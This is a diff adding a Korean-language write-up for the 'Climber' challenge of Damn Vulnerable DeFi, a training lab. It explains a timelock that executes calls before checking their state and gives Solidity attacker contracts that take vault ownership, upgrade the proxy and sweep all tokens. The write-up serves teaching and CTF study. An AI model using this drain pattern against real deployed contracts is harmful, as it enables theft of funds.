@@ -11,7 +11,7 @@
 9. [Puppet v2](https://github.com/reaperes/damn-vulnerable-defi#puppet-v2)
 10. [Free rider](https://github.com/reaperes/damn-vulnerable-defi#free-rider)
 11. Backdoor
-12. Climber
+12. [Climber](https://github.com/reaperes/damn-vulnerable-defi#climber)
 13. Safe miners
 
 ## Unstoppable
@@ -229,4 +229,101 @@ _buyOne(uint256 tokenId) 함수는 `msg.value` 가 `priceToPay` 보다 큰지 �
 이용해 15 ETH 를 대여해 marketplace 를 모두 탈취할 수 있습니다.
 
 상세한 취약점 공격하는 부분은 [링크](https://github.com/reaperes/damn-vulnerable-defi/blob/master/test/free-rider/free-rider.challenge.js#L107)
+를 참고해 주세요.
+
+## Climber
+There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
+The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
+On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
+On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
+Your goal is to empty the vault.
+
+### How to exploit
+Timelock 컨트랙트를 분석하다 보면, execute 코드 부분에서 다음과 같은 부분이 있습니다.
+```
+function execute(...) external payable {
+    ...
+    
+    for (uint8 i = 0; i < targets.length; i++) {
+        targets[i].functionCallWithValue(dataElements[i], values[i]);
+    }
+    
+    require(getOperationState(id) == OperationState.ReadyForExecution);
+    
+    ...
+}
+```
+
+먼저 검증하고 문제 없을 경우, 로직을 실행해야 하는데 이 부분이 반대로 되어 있습니다. 기본적으로 이 부분을 첫 시작으로 취약점을
+찾아내면 될 것 같습니다.
+
+이 컨트랙트는 upgraded proxy 형태를 띄고 있습니다. 이런 컨트랙트의 취약점은 보통 `악의적인 contract` 로 upgrade 를 한 이후에
+취약 함수를 호출함으로써 토큰을 탈취할 수 있습니다. 먼저 sweepFunds 를 실행할 경우 attacker 에게 token 이 모두 전송될 수 있게끔
+아래와 같은 `악의적인 contract` 를 준비합니다.
+```
+contract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    ...
+
+    function sweepFunds(address tokenAddress) external onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
+    }
+}
+```
+
+그리고 contract 를 upgrade 하기 위해서는 `transferOwnership` 함수를 호출해야 합니다. 가장 처음에 발견한 취약한 부분을
+활용하여 ownership 을 attacker 가 가져갈 수 있도록 코드를 작성합니다.
+```
+contract ClimberAttacker {
+    ...
+
+    function attack() external payable {
+        targets.push(address(vault));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", msg.sender));
+
+        targets.push(address(this));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("schedule()"));
+
+        timelock.execute(targets, values, dataElements, salt);
+    }
+
+    function schedule() public {
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+```
+
+추가적으로 delay 를 낮춰 공격이 바로 실행될 수 있도록 하는 부분을 추가해 줍니다.
+```
+contract ClimberAttacker {
+    ...
+
+    function attack() external payable {
+
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
+
+        targets.push(address(timelock));
+        values.push(0);
+        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
+
+        ...
+        
+        timelock.execute(targets, values, dataElements, salt);
+    }
+}
+```
+
+이제 준비가 모두 끝났으므로, 아래와 같은 순서대로 취약점을 공격 합니다.
+
+1. 토큰을 모두 탈취하는 `악의적인 proxy implementation contract` 배포
+2. 취약점 코드를 실행하는 Attacker contract 배포
+3. 취약점 코드 실행
+4. contract 업그레이드
+5. `sweepFunds` 함수 실행
+
+상세한 취약점 공격하는 부분은 [링크](https://github.com/reaperes/damn-vulnerable-defi/blob/master/test/climber/climber.challenge.js#L55)
 를 참고해 주세요.
